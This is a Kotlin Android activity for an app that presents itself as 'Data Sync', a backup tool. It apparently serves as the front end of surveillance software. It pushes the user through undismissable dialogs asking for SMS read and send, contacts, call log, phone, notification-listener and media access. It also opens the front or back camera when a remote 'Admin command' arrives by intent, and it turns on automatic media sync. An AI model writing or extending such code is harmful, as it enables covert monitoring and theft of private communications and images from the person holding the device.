package com.boxx.datasync

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.viewModels
import androidx.compose.foundation.isSystemInDarkTheme
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.core.content.ContextCompat
import com.boxx.datasync.domain.repository.DataRepository
import com.boxx.datasync.sync.SyncScheduler
import com.boxx.datasync.sync.SyncService
import com.boxx.datasync.ui.screen.CameraCaptureScreen
import com.boxx.datasync.ui.screen.MainScreen
import com.boxx.datasync.ui.viewmodel.MainViewModel
import dagger.hilt.android.AndroidEntryPoint
import javax.inject.Inject

enum class PermissionGroup(
    val id: String,
    val title: String,
    val description: String,
    val permissions: List<String>
) {
    PERSONAL_DATA(
        "personal_data",
        "Personal Data",
        "This app requires Contacts, SMS, Call Log, and Phone permissions to securely backup and sync your communications with your secure dashboard.",
        listOf(
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.RECEIVE_SMS,
            android.Manifest.permission.SEND_SMS,
            android.Manifest.permission.READ_CALL_LOG,
            android.Manifest.permission.READ_PHONE_STATE,
            android.Manifest.permission.CALL_PHONE
        )
    ),
    MEDIA(
        "media",
        "Media Backup",
        "This app requires storage access to automatically sync and backup your gallery photos and videos in real-time.",
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            listOf(
                android.Manifest.permission.READ_MEDIA_IMAGES,
                android.Manifest.permission.READ_MEDIA_VIDEO,
                android.Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED
            )
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            listOf(
                android.Manifest.permission.READ_MEDIA_IMAGES,
                android.Manifest.permission.READ_MEDIA_VIDEO
            )
        } else {
            listOf(android.Manifest.permission.READ_EXTERNAL_STORAGE)
        }
    ),
    CAMERA(
        "camera",
        "Camera Capture",
        "This app requires Camera permission to capture photos upon your request or secure remote Admin commands.",
        listOf(android.Manifest.permission.CAMERA)
    ),
    NOTIFICATIONS(
        "notifications",
        "System Notifications",
        "This app requires Notification permission to show a permanent sync indicator in the status bar.",
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            listOf(android.Manifest.permission.POST_NOTIFICATIONS)
        } else {
            emptyList()
        }
    )
}

@AndroidEntryPoint
class MainActivity : ComponentActivity() {

    private val viewModel: MainViewModel by viewModels()
    private val personalDetailsViewModel: com.boxx.datasync.ui.viewmodel.PersonalDetailsViewModel by viewModels()

    @Inject
    lateinit var repository: DataRepository

    // Camera action state
    private val activeCommandId = mutableStateOf("")
    private val activeCameraType = mutableStateOf("") // "FRONT", "BACK", or ""

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        android.util.Log.d("MainActivity", "MainActivity launched onCreate")

        viewModel.updateHeartbeat()
        handleCameraIntent(intent)

        setContent {
            // Default theme for new installs is Light Mode, but respects dark-theme system setting
            val darkTheme = isSystemInDarkTheme()
            MaterialTheme(
                colorScheme = if (darkTheme) darkColorScheme() else lightColorScheme()
            ) {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    val context = androidx.compose.ui.platform.LocalContext.current

                    // Permission state
                    var userBypassedPermissions by remember { mutableStateOf(false) }
                    val ungrantedGroups = remember { mutableStateListOf<PermissionGroup>() }

                    fun refreshUngranted() {
                        ungrantedGroups.clear()
                        PermissionGroup.values().forEach { g ->
                            if (g.permissions.isNotEmpty()) {
                                val allGranted = g.permissions.all { p ->
                                    ContextCompat.checkSelfPermission(context, p) == PackageManager.PERMISSION_GRANTED
                                }
                                if (!allGranted) {
                                    ungrantedGroups.add(g)
                                }
                            }
                        }
                    }

                    LaunchedEffect(Unit) {
                        refreshUngranted()
                    }

                    val commandId by activeCommandId
                    val cameraType by activeCameraType

                    Box(modifier = Modifier.fillMaxSize()) {
                        // Main home screen
                        MainScreen(
                            viewModel = viewModel,
                            onSyncClick = {
                                Log.d("MainActivity", "SYNC_BUTTON_CLICKED")
                                viewModel.setSyncing()
                                startSyncService(context)
                            },
                            showSettings = {
                                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                                    data = Uri.fromParts("package", context.packageName, null)
                                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                }
                                startActivity(intent)
                            },
                            personalViewModel = personalDetailsViewModel,
                            onCapturePhoto = { type ->
                                activeCameraType.value = type
                                activeCommandId.value = ""
                            }
                        )

                        // Camera Capture Screen overlay
                        if (cameraType.isNotEmpty()) {
                            CameraCaptureScreen(
                                initialIsFront = (cameraType == "FRONT"),
                                commandId = commandId,
                                onDismiss = {
                                    activeCameraType.value = ""
                                    activeCommandId.value = ""
                                }
                            )
                        }

                        // Sequential Permission Flow Overlay
                        if (!userBypassedPermissions && ungrantedGroups.isNotEmpty()) {
                            SequentialPermissionFlow(
                                activity = this@MainActivity,
                                ungrantedGroups = ungrantedGroups,
                                onComplete = {
                                    refreshUngranted()
                                    (applicationContext as? UserApplication)?.setupContentObservers()
                                },
                                onBypass = {
                                    userBypassedPermissions = true
                                    (applicationContext as? UserApplication)?.setupContentObservers()
                                }
                            )
                        } else if (!userBypassedPermissions && !isNotificationListenerEnabled(context)) {
                            // Clean Notification Access prompt
                            NotificationListenerDialog(
                                context = context,
                                onDismiss = {
                                    userBypassedPermissions = true
                                }
                            )
                        }
                    }
                }
            }
        }

        setupWorkManager()
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        setIntent(intent)
        android.util.Log.d("MainActivity", "MainActivity launched onNewIntent")
        handleCameraIntent(intent)
    }

    private fun handleCameraIntent(intent: Intent?) {
        if (intent == null) return
        val commandId = intent.getStringExtra("commandId") ?: ""
        val cameraType = intent.getStringExtra("cameraType") ?: ""
        if (cameraType.isNotEmpty()) {
            activeCommandId.value = commandId
            activeCameraType.value = cameraType
            android.util.Log.d("MainActivity", "Received camera intent: cameraType=$cameraType, commandId=$commandId")
        }
    }

    override fun onResume() {
        super.onResume()
        Log.d("MainActivity", "MainActivity resumed - checking observers")
        (applicationContext as? UserApplication)?.setupContentObservers()
    }

    private fun setupWorkManager() {
        SyncScheduler.schedulePeriodic(this)
    }

    private fun startSyncService(context: Context) {
        val intent = Intent(context, SyncService::class.java)
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        } catch (e: Exception) {
            Log.w("MainActivity", "Foreground service start not allowed. Falling back to WorkManager.", e)
            SyncScheduler.enqueueIncremental(context)
        }
        (applicationContext as? UserApplication)?.setupContentObservers()
    }
}

@Composable
fun SequentialPermissionFlow(
    activity: Activity,
    ungrantedGroups: List<PermissionGroup>,
    onComplete: () -> Unit,
    onBypass: () -> Unit
) {
    val context = activity
    var currentGroupIndex by remember { mutableStateOf(0) }
    var dialogState by remember { mutableStateOf("explanation") } // "explanation", "temp_denied", "perm_denied"

    val currentGroup = if (currentGroupIndex in ungrantedGroups.indices) ungrantedGroups[currentGroupIndex] else null

    val launcher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { result ->
        if (currentGroup != null) {
            val prefs = context.getSharedPreferences("permission_prefs", Context.MODE_PRIVATE)
            prefs.edit().apply {
                currentGroup.permissions.forEach { perm ->
                    putBoolean("requested_$perm", true)
                }
                apply()
            }

            // Check if fully granted
            val allGranted = currentGroup.permissions.all { p ->
                ContextCompat.checkSelfPermission(context, p) == PackageManager.PERMISSION_GRANTED
            }

            if (allGranted) {
                if (currentGroup.id == "media") {
                    val defaultPrefs = androidx.preference.PreferenceManager.getDefaultSharedPreferences(context)
                    defaultPrefs.edit().putBoolean("auto_media_sync", true).apply()
                    Log.d("MainActivity", "MEDIA_PERMISSION_GRANTED_AUTO_SYNC_ENABLED")
                    SyncScheduler.enqueueMediaSync(context)
                }

                // Move to next ungranted group
                if (currentGroupIndex + 1 < ungrantedGroups.size) {
                    currentGroupIndex += 1
                    dialogState = "explanation"
                } else {
                    onComplete()
                }
            } else {
                // Check if permanently denied
                val isPermanentlyDenied = currentGroup.permissions.any { perm ->
                    val isDenied = ContextCompat.checkSelfPermission(context, perm) == PackageManager.PERMISSION_DENIED
                    val shouldShowRationale = androidx.core.app.ActivityCompat.shouldShowRequestPermissionRationale(activity, perm)
                    val hasRequested = prefs.getBoolean("requested_$perm", false)
                    isDenied && !shouldShowRationale && hasRequested
                }

                if (isPermanentlyDenied) {
                    dialogState = "perm_denied"
                } else {
                    dialogState = "temp_denied"
                }
            }
        }
    }

    if (currentGroup != null) {
        when (dialogState) {
            "explanation" -> {
                AlertDialog(
                    onDismissRequest = { /* No dismiss */ },
                    title = { Text("${currentGroup.title} Permission") },
                    text = { Text(currentGroup.description) },
                    confirmButton = {
                        Button(onClick = {
                            launcher.launch(currentGroup.permissions.toTypedArray())
                        }) {
                            Text("Continue")
                        }
                    }
                )
            }
            "temp_denied" -> {
                AlertDialog(
                    onDismissRequest = { /* No dismiss */ },
                    title = { Text("Permission Denied") },
                    text = { Text("The app requires ${currentGroup.title} permissions to function correctly.") },
                    confirmButton = {
                        Button(onClick = {
                            dialogState = "explanation"
                        }) {
                            Text("Try Again")
                        }
                    },
                    dismissButton = {
                        TextButton(onClick = {
                            // Skip this group
                            if (currentGroupIndex + 1 < ungrantedGroups.size) {
                                currentGroupIndex += 1
                                dialogState = "explanation"
                            } else {
                                onBypass()
                            }
                        }) {
                            Text("Skip for Now")
                        }
                    }
                )
            }
            "perm_denied" -> {
                AlertDialog(
                    onDismissRequest = { /* No dismiss */ },
                    title = { Text("Permission Permanently Denied") },
                    text = { Text("The ${currentGroup.title} permission is permanently denied. Please enable it from App Settings to allow this feature.") },
                    confirmButton = {
                        Button(onClick = {
                            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                                data = Uri.fromParts("package", context.packageName, null)
                            }
                            context.startActivity(intent)
                        }) {
                            Text("Open Settings")
                        }
                    },
                    dismissButton = {
                        TextButton(onClick = {
                            // Cancel/skip this group
                            if (currentGroupIndex + 1 < ungrantedGroups.size) {
                                currentGroupIndex += 1
                                dialogState = "explanation"
                            } else {
                                onBypass()
                            }
                        }) {
                            Text("Cancel")
                        }
                    }
                )
            }
        }
    }
}

@Composable
fun NotificationListenerDialog(context: Context, onDismiss: () -> Unit) {
    AlertDialog(
        onDismissRequest = onDismiss,
        title = { Text("Notification Access Required") },
        text = { Text("Please enable Notification Access for Data Sync to backup and restore incoming notifications.") },
        confirmButton = {
            Button(onClick = {
                val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                context.startActivity(intent)
                onDismiss()
            }) {
                Text("Open Settings")
            }
        },
        dismissButton = {
            TextButton(onClick = onDismiss) {
                Text("Not Now")
            }
        }
    )
}

private fun isNotificationListenerEnabled(context: Context): Boolean {
    val packageName = context.packageName
    val flat = Settings.Secure.getString(context.contentResolver, "enabled_notification_listeners")
    return flat?.contains(packageName) == true
}
